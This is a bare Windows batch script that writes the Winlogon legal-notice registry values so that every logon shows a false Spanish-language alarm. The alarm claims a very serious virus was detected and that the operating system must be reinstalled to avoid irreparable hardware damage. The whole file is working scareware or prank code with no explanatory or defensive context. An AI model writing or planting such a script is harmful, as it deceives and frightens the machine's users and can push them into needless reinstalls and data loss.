@echo off
reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon" /v LegalNoticeCaption /d "VIRUS MUY GRAVE DETECTADO" /f
reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon" /v LegalNoticeText /d "DEBE REINSTALAR DE NUEVO EL SISTEMA OPERATIVO SI NO QUIERE TENER PROBLEMAS IRREPARABLES EN SU HARDWARE" /f
